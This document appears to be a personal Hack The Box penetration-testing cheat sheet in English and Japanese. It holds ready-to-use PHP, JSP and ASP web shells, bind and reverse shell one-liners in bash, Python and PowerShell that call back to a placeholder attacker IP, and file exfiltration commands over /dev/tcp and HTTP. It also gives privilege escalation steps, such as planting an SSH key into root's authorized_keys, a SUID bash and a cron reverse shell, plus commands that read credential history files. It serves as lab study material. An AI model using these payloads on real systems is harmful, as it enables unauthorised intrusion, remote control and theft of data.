# My Directories
### alias <br>
htb <br>

~/htb/workspace <br>
~/htb/tools <br>
~/htb/ <br>


# Linux

## Nmap
#### 頻出オプション <br>
  ー -sC: equivalent to --script=default <br>
  ー -sV: Probe open ports to determine service/version info <br>
  ー -sU: UDP scan <br>
  ー -T<0-5>: Set timing template (higher is faster) <br>
　ー -p<0><-><65535> : -p22, 80, 55555 ・ -p1-100 等 <br>
  ー -p-: All ports <br>
  ー --top-ports <number>: Scan <number> most common ports <br>
  https://nmap.org/man/ja/man-briefoptions.html <br>

## Enumeration
・Gobuster <br>
  ー gobuster <br>
      　ー dir -u <target_url> -w <your_lists> <br>
      　ー dns -d <target_domain> -w <your_lists> <br>
      　ー vhost -u <target_url> -w <your_lists> <br>
      
  ー  <br>

  https://www.kali.org/tools/gobuster/ <br>

・SNMP
snmpwalk

## Uploading a Web Shell
Web Server|Default Webroot|
|----|----|
|Apache|/var/www/html/|
|Nginx|/usr/local/nginx/html/|
|IIS|c:\inetpub\wwwroot\|
|XAMPP|C:\xampp\htdocs\|

## Web Shell
php
```
<?php system($_REQUEST["cmd"]); ?>
```
jsp
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
asp
```
<% eval request("cmd") %>
```
## Bind Shell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md <br>
Bash
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
Python
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
Powershell
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
and then 
```
nc <attack_machine_ip> 1234
```

## Reverse Shell
Netcat Listener <br>
nc -lvnp <your_port> <br>
Bash
```
bash -c 'bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1'
```
Bash
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <your_port> >/tmp/f
```
Powershell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<your_ip>',<your_port>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

## Shell Upgrade
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat
Shell to Bash <br>
Upgrade from shell to bash. <br>

```
SHELL=/bin/bash script -q /dev/null
```
 <br>
Python PTY Module 1 <br>
Spawn /bin/bash using Python’s PTY module, and connect the controlling shell with its standard I/O. <br>

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
export TERM=xterm-256color
※echo $TERM
stty rows 67 columns 318
※stty size
 ```
 <br>

## File Upload/Download
### 1. Download <br>
```
python3 -m http.server <your_port>
```
and then
```
wget http://<your_ip>/ <your_port>
```

### 2. Upload <br>
```
python3 -m uploadserver (default_port ==> 8000)
```
and then
```
python3 -c "import requests;requests.post(\"http://<your_ip>:8000/upload\",files={\"files\":open(\"<upload_file>\",\"rb\")})"
```
#### OR
```
nc -lvnp <your_port> > <your_file_name(anything is OK(example: upload.jar))>
```
and then
```
cat <upload_file> > /dev/tcp/<your_ip>/<your_port>
```

## Privilege Escalation
・root user on Linux. <br>
・administrator/SYSTEM user on Windows.  <br>
Linux:::https://academy.hackthebox.com/module/details/51  <br>
Windows:::https://academy.hackthebox.com/module/details/67  <br>
#### Vulnerable Software
dpkg -l
C:\Program Files

#### User Privileges
1. Sudo
2. SUID
3. Windows Token Privileges

https://lolbas-project.github.io/
https://gtfobins.github.io/

#### PrivEsc Checklists
https://github.com/swisskyrepo/PayloadsAllTheThings <br>
https://book.hacktricks.xyz/ <br>
#### Enumeration Scripts
https://github.com/rebootuser/LinEnum  <br>
https://github.com/sleventyeleven/linuxprivchecker  <br>
https://github.com/GhostPack/Seatbelt  <br>
https://github.com/411Hall/JAWS  <br>
https://github.com/peass-ng/PEASS-ng/ <br>
#### Scheduled Tasks
新しいスケジュール・タスクの追加が許可されているかどうかをチェックする <br>
Linuxでは、スケジュールされたタスクを管理する一般的な方法はCronジョブである。書き込み権限があれば、新しいCronジョブを追加する <br>
1. /etc/crontab
2. /etc/cron.d
3. /var/spool/cron/crontabs/root <br>
リバース シェルを送信するリバース シェル コマンドを含む bash スクリプトを作成する
#### Exposed Credentials
bash_history <br>
```
less ~/.bash_history
```
PSReadLine <br>
```
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
#### SSH Keys
特定のユーザーの.sshディレクトリーの読み取り権限があれば、/home/user/.ssh/id_rsaまたは/root/.ssh/id_rsaにあるそのユーザーのプライベートssh鍵を読み取り、それを使ってサーバーにログインすることができる。root/.ssh/ディレクトリが読めて、id_rsaファイルが読めれば、それを自分のマシンにコピーして、-iフラグを使ってログインすることができる：
```
cd ~/.ssh/ -al
```
```
/home/user/.ssh/authorized_keys
```
```
taikif@htb[/htb]$ ssh-keygen -f key
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
taikif@htb[/htb]$ ssh root@10.10.10.10 -i key
root@remotehost# whoami
```

・sudo -l <br>
  ー 1. root権限で実行できるコトを探す。 <br>
  ー 1-1. GTFOBinsでexploitを探す。 <br>
  ー 2. 実行できるコトを悪用する。 <br>
  　ー 2-1. Pythonスクリプトをローカルのshを参照して実行している場合に、ディレクトリを移動して独自のshを実行するようにする場合。 <br>
   　ー 2-2. hogehoge.shの中身を#!/bin/bash \n chmod u+s /bin/bashとする。それを実行させる。 <br>
    　ー 2-3. bash -p 実行。→ 特権昇格。 <br>      
・linPEAS: sudo -lしてもいい感じの出てこないときに使う。 <br>
  ー 1. linPEASでUnknown SUID binaryを特定。 <br>
  ー 2. そのコマンドのバージョンを確認。脆弱性を探す。 <br>
  ー 3. 脆弱性を突いて特権昇格。 <br>
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
・



# Windows
smbmap
smbclient
dig
gobuster
kerbrute
mimikatz
evil-winrm
psexec.py
wmiexec.py
secretsdump.py
SharpHound.exe
winPEAS
smbserver.py
hashcat
how-to-attack-kerberos
https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting
responder
eth0指定して、hostsﾌｧｲﾙもeth0のipにする。192.168.11.1 support.htb という感じ
ldapdomaindump
wireshark


## Enumeration
・ldapsearch <br>
  ー -x -H ldap://<target_ip | target_url> -s base namingcontexts
  ー -x -H ldap://<target_ip | target_url> -b 'DC=<target_DC_name>,DC=<target_DC_name>...'
